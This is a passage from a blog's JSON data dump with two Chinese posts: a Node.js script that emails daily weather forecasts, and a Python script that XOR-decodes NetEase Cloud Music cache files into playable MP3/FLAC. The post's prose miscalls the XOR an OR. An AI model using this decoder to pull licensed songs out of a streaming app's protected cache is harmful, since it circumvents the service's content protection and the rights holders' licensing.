class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> url= <span class=\"string\">'https://free-api.heweather.com/s6/weather/forecast?location=城市代码&amp;key=自己的key'</span>; <span class=\"comment\">// 城市代码: 从和风天气文档获得，key: 注册和风天气得到</span></span><br><span class=\"line\">\trequest(url,(error,response,body)=&gt;&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(error)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tdata=<span class=\"built_in\">JSON</span>.parse(body);</span><br><span class=\"line\">\t\tdata=data.HeWeather6[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> transporter=nodemailer.createTransport(&#123;</span><br><span class=\"line\">\t\thost: <span class=\"string\">\"smtp.163.com\"</span>, <span class=\"comment\">// 163邮箱的smtp服务器地址</span></span><br><span class=\"line\">\t\tport: <span class=\"number\">465</span>,</span><br><span class=\"line\">\t\tsecureConnection: <span class=\"literal\">true</span>,</span><br><span class=\"line\">\t\tauth: &#123;</span><br><span class=\"line\">\t\t\tuser:<span class=\"string\">'邮箱前缀@163.com'</span>, <span class=\"comment\">// 邮箱地址</span></span><br><span class=\"line\">\t\t\tpass:<span class=\"string\">'*******'</span> <span class=\"comment\">// smtp授权码，不是邮箱的登录密码</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> mailOptions=&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">from</span>: <span class=\"string\">\"预报君 &lt;邮箱前缀@163.com&gt;\"</span>, <span class=\"comment\">// 与发件地址一致，否则报错</span></span><br><span class=\"line\">\t\t\tto: <span class=\"string\">\"to someone @foxmail.com\"</span>, <span class=\"comment\">// 要发送的邮箱地址</span></span><br><span class=\"line\">\t\t\tsubject: data.daily_forecast[<span class=\"number\">0</span>].date + <span class=\"string\">'の天気'</span>,</span><br><span class=\"line\">\t\t\ttext:<span class=\"string\">'城市 :'</span>+data.basic.location+<span class=\"string\">'时间：'</span>+ data.daily_forecast[<span class=\"number\">0</span>].date,</span><br><span class=\"line\">\t\t\thtml: <span class=\"string\">'&lt;div&gt;&lt;div&gt;&lt;h1&gt;给主席的天气预报&lt;/h1&gt;&lt;/div&gt;&lt;div&gt;&lt;h3 style=\"margin:20px auto 10px auto\"&gt;'</span> + data.daily_forecast[<span class=\"number\">0</span>].date + <span class=\"string\">' '</span> + data.basic.location + <span class=\"string\">'区&lt;/h3&gt;&lt;div&gt;&lt;p&gt;&lt;span&gt;日出时间: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].sr+<span class=\"string\">'&lt;/span&gt;&lt;span style=\"width:40%;margin-left: 30px\"&gt;日落时间: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].ss+<span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;白天: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].cond_txt_d+<span class=\"string\">'&lt;/span&gt;&lt;span style=\"width:40%;margin-left: 30px\"&gt;晚间: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].cond_txt_n+<span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;最高温度: &lt;/span&gt;&lt;span&gt;&lt;b&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].tmp_max+<span class=\"string\">'&lt;/b&gt;℃&lt;/span&gt;&lt;span style=\"width:40%;margin-left: 30px\"&gt;最低温度: &lt;/span&gt;&lt;span&gt;&lt;b&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].tmp_min+<span class=\"string\">'&lt;/b&gt;℃&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;紫外线强度指数: &lt;/span&gt;&lt;span&gt;&lt;b&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].uv_index+<span class=\"string\">'&lt;/b&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;降水概率: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].pop+<span class=\"string\">' %&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;风力: &lt;/span&gt;&lt;span&gt;'</span>+data.daily_forecast[<span class=\"number\">0</span>].wind_sc+<span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;穿衣建议: &lt;/span&gt;&lt;span&gt;'</span> + data.lifestyle[<span class=\"number\">1</span>].txt + <span class=\"string\">'&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;small&gt;注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险&lt;/small&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;'</span></span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\">\t\ttransporter.sendMail(mailOptions,(err,info)=&gt;&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(err)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Message %s sent %s'</span>,info.messageId,info.response);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\ttransporter.close();</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"最终效果\"><a href=\"#最终效果\" class=\"headerlink\" title=\"最终效果\"></a>最终效果</h2><p><img src=\"/images/in-post/post-blog-WeatherEmail.jpg\" alt=\"img\"></p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>只需要不到50行就可以自动发送天气邮件了，你是不是也想给她/他每天发一条天气提醒呢？不妨试一试。<a href=\"https://github.com/miyunluo/Funny_Tools/tree/master/Weather_Email_Reporter\" target=\"_blank\" rel=\"noopener\">github</a></p>\n"},{"layout":"post","title":"50行解码网易云音乐歌曲","_content":"\n> “网易云音乐劝退文”\n\n## 前言\n\n那是和往常一样平静的一天，我像往常一样打开网易云开始下载歌曲，然后像往常一样打算放进MP3里，然后...等等，这是什么...\n\n相信很多人应该也发现了，网易云新推出了一种加密格式ncm，这下只能使用网易云播放器不说，即使你下载了歌曲，过了会员期也照样不能再播放了… ( 有句话不知当讲不当讲\n\n其实很多用户充会员的目的无非就是为了下载高品质的音乐，虽说8元每月的会员费也谈不上很昂贵，但这种强迫用户续费的逻辑着实让人大跌眼镜。这个时候知乎上必定又会有一部分人站出来说什么版权意识还需加强云云，照这个道理，岂不是买本书也需要加密了，而且不得相互借阅？虽说亚马逊确实推出了新的电子书加密格式，但是电子书属于一次买断，永久阅读，且价格合理，大多数用户还是愿意为此买单的。且不说网易云的做法完全不考虑MP3用户的感受，会员制听音乐的思路让我看不到任何诚意。\n\n---\n\n## Setup\n\n1. 找到缓存文件\n\nncm格式目前还没有解码方法，这里采取另一种思路，从缓存文件解码获得源音乐文件。一般来讲音乐播放软件为了保证播放流畅性，都会一边播放一边缓存。网易云音乐的音乐缓存文件后缀名为 `.uc!`，直接在文件管理器中搜索  `.uc!` 就可以找到文件位置。缓存文件的名字比较长，比如\n\n`78284-_-_320-_-_68ad2b2606e66f43232ee877563ab513.uc!`\n\n这里 `78284` 是歌曲id，id可以从歌曲url获得，这样根据歌曲id就可以定位对应歌曲的缓存文件了。\n\n2. 解码\n\n解码的方法很简单，缓存文件每个字节和0xA3进行或操作就可以了...方法来源于网络，但是出处找不到了-_-||。程序默认解码后文件后缀名是mp3，如果缓存文件是flac，将后缀名改为.flac。\n\n```python\nimport os\nimport sys\n\nKEY = 0xA3\ndef decode(src_path, dest_path):\n    try:\n        fin = open(src_path, \"rb\")\n    except IOError as e:\n        print(str(e))\n        return\n    try:\n        fout = open(dest_path, \"wb\")\n    except IOError as e:\n        print(str(e))\n        return\n\n    song_encode = fin.read()\n    song_decode = bytearray()\n    for i, byte in enumerate(song_encode):\n        sys.stdout.write(\"\\r处理进度: %d%%\" % (round((i + 1) * 100 / len(song_encode))))\n        sys.stdout.flush()\n        if type(byte) == str: #python 2\n            song_decode.append(int(byte.encode(\"hex\"), 16) ^ KEY)\n        else:                 #python 3\n            song_decode.append(byte ^ KEY)\n    \n    print()\n    fout.write(song_decode)\n    fin.close()\n    fout.close()\n\ndef main():\n    if len(sys.argv) !=2:\n       print(\"使用 python uc!decoder.py [source]\")\n    else:\n        last = sys.argv[1].rfind(os.path.sep)\n        src_path = sys.argv[1][:last + 1]\n        dest_path = sys.argv[1][:last + sys.argv[1][last:].find(\".\")] + \".mp3\"\n        print(\"Source path: %s\\nDestination path: %s\" % (sys.argv[1], dest_path))\n        decode(sys.argv[1], dest_path)\n        print(\"如果缓存为无损歌曲，请将后缀名由mp3改为flac\")\n\nif __name__ == '__main__':\n    main()\n```\n\n**网易云音乐今后有可能改变缓存文件的加密方式，因此该方法具有时效性，并不长期有效。**\n\n## Result\n\n从 `uc!` 文件获得了《君の名は》专辑的flac文件。\n\n![img](/images/in-post/post-blog-kimino.png)\n\n## Src\n\n[github](https://github.com/miyunluo/MusicDownloader/tree/master/Netease_uc!Decode)","source":"_posts/2018-06-14-escpfromnetease.markdown","raw":"---\nlayout:     post\ntitle:      \"50行解码网易云音乐歌曲\"\ntags:\n    - fun\n---\n\n> “网易云音乐劝退文”\n\n## 前言\n\n那是和往常一样平静的一天，我像往常一样打开网易云开始下载歌曲，然后像往常一样打算放进MP3里，然后...等等，这是什么...\n\n相信很多人应该也发现了，网易云新推出了一种加密格式ncm，这下只能使用网易云播放器不说，即使你下载了歌曲，过了会员期也照样不能再播放了… ( 有句话不知当讲不当讲\n\n其实很多用户充会员的目的无非就是为了下载高品质的音乐，虽说8元每月的会员费也谈不上很昂贵，但这种强迫用户续费的逻辑着实让人大跌眼镜。这个时候知乎上必定又会有一部分人站出来说什么版权意识还需加强云云，照这个道理，岂不是买本书也需要加密了，而且不得相互借阅？虽说亚马逊确实推出了新的电子书加密格式，但是电子书属于一次买断，永久阅读，且价格合理，大多数用户还是愿意为此买单的。且不说网易云的做法完全不考虑MP3用户的感受，会员制听音乐的思路让我看不到任何诚意。\n\n---\n\n## Setup\n\n1. 找到缓存文件\n\nncm格式目前还没有解码方法，这里采取另一种思路，从缓存文件解码获得源音乐文件。一般来讲音乐播放软件为了保证播放流畅性，都会一边播放一边缓存。网易云音乐的音乐缓存文件后缀名为 `.uc!`，直接在文件管理器中搜索  `.uc!` 就可以找到文件位置。缓存文件的名字比较长，比如\n\n`78284-_-_320-_-_68ad2b2606e66f43232ee877563ab513.uc!`\n\n这里 `78284` 是歌曲id，id可以从歌曲url获得，这样根据歌曲id就可以定位对应歌曲的缓存文件了。\n\n2. 解码\n\n解码的方法很简单，缓存文件每个字节和0xA3进行或操作就可以了...方法来源于网络，但是出处找不到了-_-||。程序默认解码后文件后缀名是mp3，如果缓存文件是flac，将后缀名改为.flac。\n\n```python\nimport os\nimport sys\n\nKEY = 0xA3\ndef decode(src_path, dest_path):\n    try:\n        fin = open(src_path, \"rb\")\n    except IOError as e:\n        print(str(e))\n        return\n    try:\n        fout = open(dest_path, \"wb\")\n    except IOError as e:\n        print(str(e))\n        return\n\n    song_encode = fin.read()\n    song_decode = bytearray()\n    for i, byte in enumerate(song_encode):\n        sys.stdout.write(\"\\r处理进度: %d%%\" % (round((i + 1) * 100 / len(song_encode))))\n        sys.stdout.flush()\n        if type(byte) == str: #python 2\n            song_decode.append(int(byte.encode(\"hex\"), 16) ^ KEY)\n        else:                 #python 3\n            song_decode.append(byte ^ KEY)\n    \n    print()\n    fout.write(song_decode)\n    fin.close()\n    fout.close()\n\ndef main():\n    if len(sys.argv) !=2:\n       print(\"使用 python uc!decoder.py [source]\")\n    else:\n        last = sys.argv[1].rfind(os.path.sep)\n        src_path = sys.argv[1][:last + 1]\n        dest_path = sys.argv[1][:last + sys.argv[1][last:].find(\".\")] + \".mp3\"\n        print(\"Source path: %s\\nDestination path: %s\" % (sys.argv[1], dest_path))\n        decode(sys.argv[1], dest_path)\n        print(\"如果缓存为无损歌曲，请将后缀名由mp3改为flac\")\n\nif __name__ == '__main__':\n    main()\n```\n\n**网易云音乐今后有可能改变缓存文件的加密方式，因此该方法具有时效性，并不长期有效。**\n\n## Result\n\n从 `uc!` 文件获得了《君の名は》专辑的flac文件。\n\n![img](/images/in-post/post-blog-kimino.png)\n\n## Src\n\n[github](https://github.com/miyunluo/MusicDownloader/tree/master/Netease_uc!Decode)","slug":"escpfromnetease","published":1,"date":"2018-06-13T16:00:00.000Z","updated":"2018-06-14T12:17:22.000Z","_id":"cjiei9k6f0000nskejhcu9nis","comments":1,"photos":[],"link":"","content":"<blockquote>\n<p>“网易云音乐劝退文”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>那是和往常一样平静的一天，我像往常一样打开网易云开始下载歌曲，然后像往常一样打算放进MP3里，然后…等等，这是什么…</p>\n<p>相信很多人应该也发现了，网易云新推出了一种加密格式ncm，这下只能使用网易云播放器不说，即使你下载了歌曲，过了会员期也照样不能再播放了… ( 有句话不知当讲不当讲</p>\n<p>其实很多用户充会员的目的无非就是为了下载高品质的音乐，虽说8元每月的会员费也谈不上很昂贵，但这种强迫用户续费的逻辑着实让人大跌眼镜。这个时候知乎上必定又会有一部分人站出来说什么版权意识还需加强云云，照这个道理，岂不是买本书也需要加密了，而且不得相互借阅？虽说亚马逊确实推出了新的电子书加密格式，但是电子书属于一次买断，永久阅读，且价格合理，大多数用户还是愿意为此买单的。且不说网易云的做法完全不考虑MP3用户的感受，会员制听音乐的思路让我看不到任何诚意。</p>\n<hr>\n<h2 id=\"Setup\"><a href=\"#Setup\" class=\"headerlink\" title=\"Setup\"></a>Setup</h2><ol>\n<li>找到缓存文件</li>\n</ol>\n<p>ncm格式目前还没有解码方法，这里采取另一种思路，从缓存文件解码获得源音乐文件。一般来讲音乐播放软件为了保证播放流畅性，都会一边播放一边缓存。网易云音乐的音乐缓存文件后缀名为 <code>.uc!</code>，直接在文件管理器中搜索  <code>.uc!</code> 就可以找到文件位置。缓存文件的名字比较长，比如</p>\n<p><code>78284-_-_320-_-_68ad2b2606e66f43232ee877563ab513.uc!</code></p>\n<p>这里 <code>78284</code> 是歌曲id，id可以从歌曲url获得，这样根据歌曲id就可以定位对应歌曲的缓存文件了。</p>\n<ol start=\"2\">\n<li>解码</li>\n</ol>\n<p>解码的方法很简单，缓存文件每个字节和0xA3进行或操作就可以了…方法来源于网络，但是出处找不到了-_-||。程序默认解码后文件后缀名是mp3，如果缓存文件是flac，将后缀名改为.flac。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">KEY = <span class=\"number\">0xA3</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode</span><span class=\"params\">(src_path, dest_path)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        fin = open(src_path, <span class=\"string\">\"rb\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IOError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(str(e))</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        fout = open(dest_path, <span class=\"string\">\"wb\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IOError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(str(e))</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    song_encode = fin.read()</span><br><span class=\"line\">    song_decode = bytearray()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, byte <span class=\"keyword\">in</span> enumerate(song_encode):</span><br><span class=\"line\">        sys.stdout.write(<span class=\"string\">\"\\r处理进度: %d%%\"</span> % (round((i + <span class=\"number\">1</span>) * <span class=\"number\">100</span> / len(song_encode))))</span><br><span class=\"line\">        sys.stdout.flush()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> type(byte) == str: <span class=\"comment\">#python 2</span></span><br><span class=\"line\">            song_decode.append(int(byte.encode(<span class=\"string\">\"hex\"</span>), <span class=\"number\">16</span>) ^ KEY)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:                 <span class=\"comment\">#python 3</span></span><br><span class=\"line\">            song_decode.append(byte ^ KEY)</span><br><span class=\"line\">    </span><br><span class=\"line\">    print()</span><br><span class=\"line\">    fout.write(song_decode)</span><br><span class=\"line\">    fin.close()</span><br><span class=\"line\">    fout.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(sys.argv) !=<span class=\"number\">2</span>:</span><br><span class=\"line\">       print(<span class=\"string\">\"使用 python uc!decoder.py [source]\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        last = sys.argv[<span class=\"number\">1</span>].rfind(os.path.sep)</span><br><span class=\"line\">        src_path = sys.argv[<span class=\"number\">1</span>][:last + <span class=\"number\">1</span>]</span><br><span class=\"line\">        dest_path = sys.argv[<span class=\"number\">1</span>][:last + sys.argv[<span class=\"number\">1</span>][last:].find(<span class=\"string\">\".\"</span>)] + <span class=\"string\">\".mp3\"</span></span><br><span class=\"line\">        print(<span class=\"string\">\"Source path: %s\\nDestination path: %s\"</span> % (sys.argv[<span class=\"number\">1</span>], dest_path))</span><br><span class=\"line\">        decode(sys.argv[<span class=\"number\">1</span>], dest_path)</span><br><span class=\"line\">        print(<span class=\"string\">\"如果缓存为无损歌曲，请将后缀名由mp3改为flac\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p><strong>网易云音乐今后有可能改变缓存文件的加密方式，因此该方法具有时效性，并不长期有效。</strong></p>\n<h2 id=\"Result\"><a href=\"#Result\" class=\"headerlink\" title=\"Result\"></a>Result</h2><p>从 <code>uc!</code> 文件获得了《君の名は》专辑的flac文件。</p>\n<p><img src=\"/images/in-post/post-blog-kimino.png\" alt=\"img\"></p>\n<h2 id=\"Src\"><a href=\"#Src\" class=\"headerlink\" title=\"Src\"></a>Src</h2><p><a href=\"https://github.com/miyunluo/MusicDownloader/tree/master/Netease_uc!Decode\" target=\"_blank\" rel=\"noopener\">github</a></p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Cm5sclock","url":"http://cmsclock.miyunluo.com","desc":"桜の花の落ちるスピード。秒速5センチメートル"}]}},"excerpt":"","more":"<blockquote>\n<p>“网易云音乐劝退文”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>那是和往常一样平静的一天，我像往常一样打开网易云开始下载歌曲，然后像往常一样打算放进MP3里，然后…等等，这是什么…</p>\n<p>相信很多人应该也发现了，网易云新推出了一种加密格式ncm，这下只能使用网易云播放器不说，即使你下载了歌曲，过了会员期也照样不能再播放了… ( 有句话不知当讲不当讲</p>\n<p>其实很多用户充会员的目的无非就是为了下载高品质的音乐，虽说8元每月的会员费也谈不上很昂贵，但这种强迫用户续费的逻辑着实让人大跌眼镜。这个时候知乎上必定又会有一部分人站出来说什么版权意识还需加强云云，照这个道理，岂不是买本书也需要加密了，而且不得相互借阅？虽说亚马逊确实推出了新的电子书加密格式，但是电子书属于一次买断，永久阅读，且价格合理，大多数用户还是愿意为此买单的。且不说网易云的做法完全不考虑MP3用户的感受，会员制听音乐的思路让我看不到任何诚意。</p>\n<hr>\n<h2 id=\"Setup\"><a href=\"#Setup\" class=\"headerlink\" title=\"Setup\"></a>Setup</h2><ol>\n<li>找到缓存文件</li>\n</ol>\n<p>ncm格式目前还没有解码方法，这里采取另一种思路，从缓存文件解码获得源音乐文件。一般来讲音乐播放软件为了保证播放流畅性，都会一边播放一边缓存。网易云音乐的音乐缓存文件后缀名为 <code>.uc!</code>，直接在文件管理器中搜索  <code>.uc!</code> 就可以找到文件位置。缓存文件的名字比较长，比如</p>\n<p><code>78284-_-_320-_-_68ad2b2606e66f43232ee877563ab513.uc!</code></p>\n<p>这里 <code>78284</code> 是歌曲id，id可以从歌曲url获得，这样根据歌曲id就可以定位对应歌曲的缓存文件了。</p>\n<ol start=\"2\">\n<li>解码</li>\n</ol>\n<p>解码的方法很简单，缓存文件每个字节和0xA3进行或操作就可以了…方法来源于网络，但是出处找不到了-_-||。程序默认解码后文件后缀名是mp3，如果缓存文件是flac，将后缀名改为.flac。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">KEY = <span class=\"number\">0xA3</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode</span><span class=\"params\">(src_path, dest_path)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        fin = open(src_path, <span class=\"string\">\"rb\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IOError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(str(e))</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        fout = open(dest_path, <span class=\"string\">\"wb\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IOError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(str(e))</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    song_encode = fin.read()</span><br><span class=\"line\">    song_decode = bytearray()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, byte <span class=\"keyword\">in</span> enumerate(song_encode):</span><br><span class=\"line\">        sys.stdout.write(<span class=\"string\">\"\\r处理进度: %d%%\"</span> % (round((i + <span class=\"number\">1</span>) * <span class=\"number\">100</span> / len(song_encode))))</span><br><span class=\"line\">        sys.stdout.flush()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> type(byte) == str: <span class=\"comment\">#python 2</span></span><br><span class=\"line\">            song_decode.append(int(byte.encode(<span class=\"string\">\"hex\"</span>), <span class=\"number\">16</span>) ^ KEY)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:                 <span class=\"comment\">#python 3</span></span><br><span class=\"line\">            song_decode.append(byte ^ KEY)</span><br><span class=\"line\">    </span><br><span class=\"line\">    print()</span><br><span class=\"line\">    fout.write(song_decode)</span><br><span class=\"line\">    fin.close()</span><br><span class=\"line\">    fout.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(sys.argv) !=<span class=\"number\">2</span>:</span><br><span class=\"line\">       print(<span class=\"string\">\"使用 python uc!decoder.py [source]\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        last = sys.argv[<span class=\"number\">1</span>].rfind(os.path.sep)</span><br><span class=\"line\">        src_path = sys.argv[<span class=\"number\">1</span>][:last + <span class=\"number\">1</span>]</span><br><span class=\"line\">        dest_path = sys.argv[<span class=\"number\">1</span>][:last + sys.argv[<span class=\"number\">1</span>][last:].find(<span class=\"string\">\".\"</span>)] + <span class=\"string\">\".mp3\"</span></span><br><span class=\"line\">        print(<span class=\"string\">\"Source path: %s\\nDestination path: %s\"</span> % (sys.argv[<span class=\"number\">1</span>], dest_path))</span><br><span class=\"line\">        decode(sys.argv[<span class=\"number\">1</span>], dest_path)</span><br><span class=\"line\">        print(<span class=\"string\">\"如果缓存为无损歌曲，请将后缀名由mp3改为flac\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p><strong>网易云音乐今后有可能改变缓存文件的加密方式，因此该方法具有时效性，并不长期有效。</strong></p>\n<h2 id=\"Result\"><a href=\"#Result\" class=\"headerlink\" title=\"Result\"></a>Result</h2><p>从 <code>uc!</code> 文件获得了《君の名は》专辑的flac文件。</p>\n<p><img src=\"/images/in-post/post-blog-kimino.png\" alt=\"img\"></p>\n<h2 id=\"Src\"><a href=\"#Src\" class=\"headerlink\" title=\"Src\"></a>Src</h2><p><a href=\"https://github.com/miyunluo/MusicDownloader/tree/master/Netease_uc!Decode\" target=\"_blank\" rel=\"noopener\">github</a></p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cji4qizao0002rikexxzdtsl0","tag_id":"cji4qizav0004rikeuw496oyz","_id":"cji4qizb00009rikei2f9a7vw"},{"post_id":"cji4qizb1000arikey9k1622z","tag_id":"cji4qizb00008rike6aoxgaj9","_id":"cji4qizb4000drike0b0tprep"},{"post_id":"cji4qizas0003rikej4vdmrhv","tag_id":"cji4qizb00008rike6aoxgaj9","_id":"cji4qizb5000frikek9b2qkui"},{"post_id":"cji4qizaw0005rikeqrjgz6sk","tag_id":"cji4qizb4000crikef6xtxnaw","_id":"cji4qizb8000jrikevm0hky5n"},{"post_id":"cji4qizay0006rikey2v985ir","tag_id":"cji4qizb7000hrikeh2yqhj2y","_id":"cji4qizbb000nrike8p4bbqrd"},{"post_id":"cji4qizaz0007rike3tkui7ze","tag_id":"cji4qizb7000hrikeh2yqhj2y","_id":"cji4qizbd000rrike1krwak7w"},{"post_id":"cji4qizb2000brikempouypxr","tag_id":"cji4qizbc000prike0wssvvo5","_id":"cji4qizbf000vrikeca1r77rs"},{"post_id":"cji4qizb5000erikev7qcly7j","tag_id":"cji4qizbf000urike40r1bj6k","_id":"cji4qizbh000yrikecpz9cx6v"},{"post_id":"cji4qizb6000grikes9nkq4j0","tag_id":"cji4qizbc000prike0wssvvo5","_id":"cji4qizbh0010rikexorfdozi"},{"post_id":"cji4qizb7000iriked2q3e3qf","tag_id":"cji4qiz